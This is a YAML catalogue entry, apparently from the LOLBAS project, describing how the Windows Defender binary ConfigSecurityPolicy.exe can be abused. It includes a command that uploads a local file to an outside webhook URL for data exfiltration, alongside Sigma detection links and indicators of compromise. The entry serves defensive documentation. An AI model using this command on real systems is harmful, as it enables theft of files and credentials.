---
Name: ConfigSecurityPolicy.exe
Description: Binary part of Windows Defender. Used to manage settings in Windows Defender. you can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.
Author: 'Ialle Teixeira'
Created: 2020-09-04
Commands:
  - Command: ConfigSecurityPolicy.exe C:\\Windows\\System32\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile
    Description: Upload file, credentials or data exfiltration in general
    Usecase: Upload file
    Category: Upload
    Privileges: User
    MitreID: T1567
    OperatingSystem: Windows 10
Full_Path:
  - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/5e57e476c29980800dcc88a7a001ddb75d21a58b/rules/windows/process_creation/win_pc_lolbas_configsecuritypolicy.yml
  - IOC: ConfigSecurityPolicy storing data into alternate data streams.
  - IOC: Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS.
  - IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe.
  - IOC: User Agent is "MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
Resources:
  - Link: https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-switch-workloads
  - Link: https://docs.microsoft.com/en-US/mem/configmgr/comanage/workloads
  - Link: https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-monitor
  - Link: https://twitter.com/NtSetDefault/status/1302589153570365440?s=20
Acknowledgement:
  - Person: Ialle Teixeira
    Handle: '@NtSetDefault'
---
